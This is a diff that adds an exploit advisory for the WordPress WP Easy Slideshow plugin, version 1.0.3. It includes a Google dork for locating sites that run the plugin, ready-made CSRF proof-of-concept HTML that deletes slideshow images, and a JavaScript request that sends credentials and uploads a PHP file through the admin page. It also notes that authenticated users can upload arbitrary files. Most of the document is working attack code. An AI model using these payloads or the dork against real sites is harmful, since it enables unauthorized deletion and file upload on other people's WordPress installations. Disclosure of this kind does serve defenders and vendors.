@@ -1,0 +1,81 @@
+# Exploit Title: Wordpress WP Easy Slideshow Plugin Multiple Vulnerabilities
+# Google Dork: inurl:/wp-content/uploads/wp-easy-slideshow/
+# Date: 2 April 2015
+# Exploit Author: Divya
+# Vendor Homepage: https://wordpress.org/plugins/wp-easy-slideshow/
+# Software Link: https://downloads.wordpress.org/plugin/wp-easy-slideshow.zip
+# Version: 1.0.3
+# Tested on: Windows, Linux
+# CVE : None
+
+Delete operation using CSRF:
+
+<img src="http://192.168.1.2/wp-admin/admin.php?page=wss-images&del_id=[number]">
+Example: http://192.168.1.2/wp-admin/admin.php?page=wss-images&del_id=1
+
+<html>
+  <head><title>CSRF Delete Operation</title></head>
+  <body>
+    <form action="http://192.168.1.2/wp-admin/admin.php">
+      <input type="hidden" name="page" value="wss-images" />
+      <input type="hidden" name="del_id" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Arbitrary File Upload using CSRF:
+
+<html>
+  <head><title>WP CSRF File Upload</title></head>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/wordpress/wp-admin/admin.php?page=wss-add-image", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------1559691976562");
+        xhr.withCredentials = true;
+        var body = "-----------------------------1559691976562\r\n" + 
+          "Content-Disposition: form-data; name=\"wss_image\"; filename=\"myfile.php\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3c?php\r\n" + 
+          "phpinfo();\r\n" + 
+          "?\x3e\r\n" + 
+          "-----------------------------1559691976562\r\n" + 
+          "Content-Disposition: form-data; name=\"desc_content\"\r\n" + 
+          "\r\n" + 
+          "CSRF File Upload\r\n" + 
+          "-----------------------------1559691976562\r\n" + 
+          "Content-Disposition: form-data; name=\"image_link\"\r\n" + 
+          "\r\n" + 
+          "linkData\r\n" + 
+          "-----------------------------1559691976562\r\n" + 
+          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+          "\r\n" + 
+          "Submit\r\n" + 
+          "-----------------------------1559691976562--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+Arbitrary File Upload (Authenticated):
+
+URL: http://192.168.1.2/wp-admin/admin.php?page=wss-add-image
+
+The upload script allows uploading arbitrary files. The files are renamed to numbers like 1,2,3,... The uploaded files cannot be executed on server.
+
+Upload Location: http://192.168.1.2/wp-content/uploads/wp-easy-slideshow/
